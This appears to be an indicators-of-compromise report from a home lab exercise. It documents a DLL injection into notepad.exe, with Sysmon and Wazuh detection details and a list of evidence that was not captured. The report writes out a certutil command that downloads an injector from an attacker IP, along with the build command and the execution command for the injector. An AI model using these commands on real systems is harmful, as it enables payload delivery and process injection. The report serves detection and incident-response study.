# 04 — Indicators of Compromise (IOCs)

## Network

| IOC | Value | Context |
|---|---|---|
| Attacker IP | **192.168.100.107** (Kali `butch`, observed this run; Week-1 cases observed `.106`) | HTTP server port 80 |
| URL | `http://192.168.100.107/injector.exe` | Pulled via `certutil -urlcache` |
| URL (inferred, not captured) | `http://192.168.100.107/inject.dll` | Payload DLL delivery |

## Host / file

| IOC | Value | Context |
|---|---|---|
| Injector path | `C:\Users\Public\injector.exe` | Dropped by `certutil`; size **270465 bytes**; hash **not captured** |
| Payload DLL path | `C:\Users\Public\inject.dll` | Loaded into notepad; hash **not captured**; source **not captured** |
| Injector build | `x86_64-w64-mingw32-gcc -o injector.exe injector.c` | mtime `Nov 13 07:48` (Kali EST) = `12:48 UTC` |
| LOLBin command | `certutil -urlcache -split -f http://192.168.100.107/injector.exe C:\Users\Public\injector.exe` | T1105 |
| Execution command | `C:\Users\Public\injector.exe 2052 C:\Users\Public\inject.dll` | stdout: "Successfully injected! Waiting for thread completion..." |
| Payload artifact | MessageBox title **"PWNED"**, body **"Injected into remote process - code exec"** (MB_OK \| MB_ICONINFORMATION) | Proof of code exec in notepad |

## Process / thread

| IOC | Value | Context |
|---|---|---|
| Target process | `C:\Windows\System32\notepad.exe`, PID **2052**, Session 1 (Console), user `DESKTOP-F0JVTQT\bryll` | ProcessGuid `{03477e4a-96ba-6af4-b112-000000000800}` |
| Injector process | `C:\Users\Public\injector.exe`, PID **3128**, user `DESKTOP-F0JVTQT\bryll` | ProcessGuid `{03477e4a-0775-6af7-5b14-000000000800}` |
| Remote thread | NewThreadId **912**, StartAddress `0x00007FFADC2E0C50`, StartModule `C:\Windows\System32\KERNEL32.DLL`, **StartFunction `LoadLibraryA`** | Sysmon EID 8 |
| Injected DLL (in-memory) | `inject.dll` mapped into `notepad.exe` (PID 2052) | Would appear in Sysmon EID 7 / `listdlls` — not captured |

## Detection event

| IOC | Value |
|---|---|
| Event | Sysmon EID **8** (CreateRemoteThread), `eventRecordID` **12279** |
| `ruleName` | `technique_id=T1055, technique_name=Process Injection` |
| `utcTime` | `2026-11-13 12:49:57.225` UTC (dashboard PHT: `20:49:57`) |
| Provider | `Microsoft-Windows-Sysmon`, GUID `{5770385f-c22a-43e0-bf4c-06f5698ffbd9}` |
| Agent | `winhome01` (id 002, 192.168.100.108), manager `wazuh-server` |

## Accounts / identity

- Victim interactive user: `DESKTOP-F0JVTQT\bryll` (both source and target user — same-user injection).
- No privilege escalation, no new accounts, no lateral movement observed.

## Honesty gaps (IOCs not captured — recommend re-run to collect)

1. SHA256/MD5/SHA1 of `injector.exe` and `inject.dll` (run `Get-FileHash`; also present in Sysmon EID 1 `hashes` field).
2. Sysmon EID 10 `GrantedAccess` mask for the `OpenProcess` call.
3. Sysmon EID 7 `imageLoaded` = `C:\Users\Public\inject.dll` with `signed: false`.
4. Kali `python3 -m http.server` access log lines (GET `/injector.exe`, GET `/inject.dll` from 192.168.100.108).
5. Sysmon EID 1 `certutil.exe` command line + EID 3 outbound connection to .107:80.
6. Sysmon EID 11 file-creation events for both drops.
